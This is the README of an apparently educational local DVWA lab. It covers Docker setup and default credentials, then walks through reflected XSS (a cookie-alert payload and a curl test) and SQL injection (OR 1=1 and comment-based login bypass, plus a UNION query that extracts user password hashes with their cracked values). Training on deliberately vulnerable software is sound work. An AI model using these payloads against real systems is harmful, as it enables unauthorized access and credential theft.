# DVWA Web Fundamentals: Intro XSS & SQL Injection

## Overview

Understand foundational web vulnerabilities: Reflected Cross-Site Scripting (XSS) and Authentication Bypass / Data Extraction via SQL Injection using Damn Vulnerable Web Application (DVWA).

- **Default Port / Access**: `http://localhost:8083`
- **Database Setup URL**: `http://localhost:8083/setup.php`
- **Directory**: `Classes/01_cyber_security_ethical_hacking/web_basics_dvwa`

---

## Architecture

This lab runs an isolated 2-tier architecture:

- **`dvwa-basic` (`cyberlab_01_dvwa_basics`)**: Web application container running Apache/PHP (`vulnerables/web-dvwa:latest`) exposed on host port `8083:80`. Configured via container entrypoint substitution to communicate directly with the database service `db`.
- **`db` (`cyberlab_01_dvwa_db`)**: MariaDB 10.11 database server on the isolated `internal` network with persistent volume `dvwa_data`.

---

## How to Solve & Practice

### 1. Start the Lab

From the repository root:

```bash
./lab start dvwa-basic
```

Or from this directory:

```bash
docker compose up -d
```

### 2. Database Initialization

1. Navigate to **`http://localhost:8083/setup.php`** (or browse to `http://localhost:8083` which redirects to setup if uninitialized).
2. Click the **'Create / Reset Database'** button at the bottom of the page.
3. The setup script will drop and recreate the `dvwa` database, generate tables (`users`, `guestbook`), and seed initial users.
4. You will see `Setup successful!` and be redirected to `login.php`.

### 3. Authentication & Configuration

- **Login URL**: `http://localhost:8083/login.php`
- **Default Credentials**:
  - **Username**: `admin`
  - **Password**: `password`
- **Security Level**:
  1. Once logged in, click **DVWA Security** in the left menu.
  2. Set the script security level to **Low** and click **Submit**.

---

## Proof of Exploits

### 1. Reflected Cross-Site Scripting (XSS)

- **Vulnerable Module**: `http://localhost:8083/vulnerabilities/xss_r/`
- **Vulnerability**: The `name` parameter in the GET request is reflected in the HTML response without sanitization or output encoding.
- **Exploit Payload**:
  ```html
  <script>
    alert(document.cookie);
  </script>
  ```
- **Proof of Execution**:
  1. Enter `<script>alert(document.cookie)</script>` into the **"What's your name?"** input field and click **Submit**.
  2. The browser immediately executes the injected JavaScript and displays an alert box displaying the session cookie (`PHPSESSID=...; security=low`).
  3. Direct URL test:
     ```bash
     curl -s "http://localhost:8083/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(document.cookie)%3C/script%3E" -b "PHPSESSID=<SESSION_ID>; security=low" | grep "<script>alert"
     ```

### 2. SQL Injection & Authentication Bypass

- **Vulnerable Module**: `http://localhost:8083/vulnerabilities/sqli/`
- **Vulnerability**: The application constructs SQL queries through unsanitized string concatenation:
  ```php
  $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
  ```

#### A. Logic / Authentication Bypass Proof

- **Exploit Payload**:
  ```sql
  ' OR '1'='1
  ```
- **Resulting SQL Query**:
  ```sql
  SELECT first_name, last_name FROM users WHERE user_id = '' OR '1'='1';
  ```
- **Proof of Execution**:
  1. Enter `' OR '1'='1` in the **User ID** input and submit.
  2. Because `'1'='1'` is always true, the WHERE clause evaluates to TRUE for every row in the `users` table.
  3. The application outputs all database records: `admin`, `Gordon Brown`, `Hack Me`, `Pablo Picasso`, and `Bob Smith`.
  4. In authentication scenarios (e.g. `SELECT * FROM users WHERE user='$user' AND pass='$pass'`), entering `admin' --` or `' OR '1'='1' --` bypasses the password condition entirely and authenticates as the first record (`admin`).

#### B. Credential Extraction via UNION-Based SQLi Proof

- **Exploit Payload**:
  ```sql
  ' UNION SELECT user, password FROM users #
  ```
- **Proof of Execution**:
  1. Enter `' UNION SELECT user, password FROM users #` into the **User ID** input.
  2. DVWA displays all usernames alongside their MD5 password hashes:
     - `admin`: `5f4dcc3b5aa765d61d8327deb882cf99` (cracks to `password`)
     - `gordonb`: `e99a18c428cb38d5f260853678922e03` (cracks to `abc123`)
     - `1337`: `8d3533d75ae2c3966d7e0d4fcc69216b` (cracks to `charley`)
     - `pablo`: `0d107d09f5bbe40cade3de5c71e9e9b7` (cracks to `letmein`)
     - `smithy`: `5f4dcc3b5aa765d61d8327deb882cf99` (cracks to `password`)

---

## YouTube Walkthroughs & Solving Guides

- [SQL Injection for Beginners (DVWA Walkthrough)](https://www.youtube.com/watch?v=aYFZp80eOb0)
- [InsiderPhD - DVWA Brute Force Walkthrough](https://www.youtube.com/watch?v=SWzxoK6DAE4)
- [InsiderPhD - DVWA Cross Site Request Forgery (CSRF) Walkthrough](https://www.youtube.com/watch?v=Nfb9E8MJv6k)

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Start the lab
./lab start dvwa-basic

# Check status
./lab status

# Stop this lab
./lab stop dvwa-basic
# or from this directory:
docker compose down
```
